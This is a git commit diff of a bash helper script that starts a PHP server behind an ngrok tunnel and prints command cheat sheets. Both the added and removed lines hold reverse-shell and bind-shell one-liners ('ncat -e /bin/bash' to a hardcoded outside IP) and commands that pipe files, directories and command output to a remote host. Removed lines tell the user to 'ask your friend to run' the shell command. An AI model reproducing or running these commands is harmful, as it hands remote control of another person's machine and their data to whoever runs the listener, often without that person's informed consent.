47760438a6f2466f45ddf4b16e720175782b5956
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2022-05-28 17:16:27 +0530

    Update server.sh

--- Demo/server.sh
+++ Demo/server.sh
@@ -1,3 +1,4 @@
+#!/bin/bash
 Black='\033[0;30m'
 Red='\033[0;31m'
 Green='\033[0;32m'
@@ -10,7 +11,19 @@ Cyan='\033[0;36m'
 White='\033[0;37m'
 clear='\033[0m'
 
-
+check() 
+{
+if [[ -e $HOME/.vf ]]
+then
+  echo ""
+else
+# payload port
+echo -en "[${Green}✔${clear}] ${IYellow}ENTER VPN PORT (SETUP): ${clear}"
+read vpnp
+echo $vpnp >$HOME/.vf 
+fi
+}
+check
 #pending
 # 1 ngrok vpn connect
 # 1 internet connection check
@@ -18,42 +31,47 @@ clear='\033[0m'
 clear;ls -la |grep "^-"|awk '{print $NF}'|awk '{print "<b><a href=\""$1"\">"$NF"</a></b><br />"}'|awk '!/index.html/' >index.html
 chmod a=r index.html;chmod u=rw index.html
 ifcnoio=$(ifconfig|grep 192|awk '{print $2}')
-vppo=$(echo $vport)
+#vppo=$(echo $vport)
 vport=$(cat $HOME/.vf)
+
 echo -e "
 [${Green}✔${clear}] ${Yellow}Local server scripts:${clear}
-\t${IGreen}├──${clear} python -m SimpleHTTPServer 8000
-\t${IGreen}├──${clear} python3 -m SimpleHTTPServer 8000
-\t${IGreen}├──${clear} twistd -n web -p 8000 --path .
-\t${IGreen}├──${clear} ruby -run -ehttpd . -p8000
-\t${IGreen}├──${clear} php -S localhost:8000
-\t${IGreen}└──${clear} php -S $ifcnoio:8000
+\t${IGreen}├──${clear}${Green} python -m SimpleHTTPServer 8000
+\t${IGreen}├──${clear}${Green} python3 -m SimpleHTTPServer 8000
+\t${IGreen}├──${clear}${Green} twistd -n web -p 8000 --path .
+\t${IGreen}├──${clear}${Green} ruby -run -ehttpd . -p8000
+\t${IGreen}├──${clear}${Green} php -S localhost:8000
+\t${IGreen}├──${clear}${Green} command | ncat -v -lk -p 8080
+\t${IGreen}└──${clear}${Green} php -S $ifcnoio:8000 ${clear}
 
 [${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts:${clear}
 [${Green}✔${clear}] ${IYellow}ACCESS TERMINAL${clear}
-[${Green}✔${clear}] ${Yellow}ASK YOUR FRINED TO RUN SCRIPT${clear}
-\t${IGreen}├──${clear} ${Green}nc -e /bin/bash 193.161.193.99 $vport ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -e /bin/bash 193.161.193.99 $vport${clear}
-
-[${Green}✔${clear}] ${Yellow}LISTENER FOR YOU${clear}
-\t${IGreen}├──${clear} ${Green}ncat -klvp $port ${clear}
-\t${IGreen}└──${clear} ${Green}nc -klvp $port ${clear}
+\t${IGreen}├──${clear} ${Green}ncat -e /bin/bash 193.161.193.99 $vport ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -klvp 5576{clear}
 
 [${Green}✔${clear}] ${IYellow}SHARE TERMINAL${clear}
-[${Green}✔${clear}] ${Yellow}ASK YOUR FRINED TO RUN SCRIPT${clear}
-\t${IGreen}├──${clear} ${Green}nc -v -n 193.161.193.99 $vport ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -v -n 193.161.193.99 $vport ${clear}
+\t${IGreen}├──${clear} ${Green}ncat -v -n 193.161.193.99 $vport ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -k -l -p 5576 -e /bin/bash${clear}
 
-[${Green}✔${clear}] ${Yellow}LISTENER FOR YOU${clear}
-\t${IGreen}├──${clear} ${Green}ncat -k -l -p $port -e /bin/bash${clear}
-\t${IGreen}└──${clear} ${Green}nc -k -l -p $port -e /bin/bash${clear}"
+[${Green}✔${clear}] ${IYellow}SHARE FILES QUICKLY${clear}
+\t${IGreen}├──${clear} ${Green}ncat 193.161.193.99 $vport < \$PWD/share.EXT${clear}
+\t${IGreen}└──${clear} ${Green}ncat -vl -k 5576 > saved ${clear}
+
+[${Green}✔${clear}] ${IYellow}SHARE SUBDIRECTORY QUICKLY${clear}
+\t${IGreen}├──${clear} ${Green}tar zcfP - fi_files | ncat 192.168.1.4 $vport${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 | tar xvpz${clear}
+
+[${Green}✔${clear}] ${IYellow}USE ANY COMMAND SAVE OUTPUT${clear}
+\t${IGreen}├──${clear} ${Green}uname | ncat 192.168.1.4 $vport${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 > savedout${clear}
+"
 pkill php
 pkill ngrok
 
 php -S localhost:5555 > /dev/null 2>&1 &
 #Starting ngrok
 echo
-echo -e "[${Green}✔${clear}] ${Yellow}GENERATING LINK PLEASE WAIT... ${clear}"
+echo -e "[${Green}✔${clear}] ${IYellow}GENERATING LINK PLEASE WAIT... ${clear}"
 
 $HOME/ngrok http 5555 > /dev/null 2>&1 &
 sleep 7
@@ -62,4 +80,3 @@ ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#h
 
 echo -e "\t${IGreen}├──${clear} ${Green}$ngrok_link ${clear}"
 echo -e "\t${IGreen}└──${clear} ${Green}http://localhost:5555 ${clear}"
-
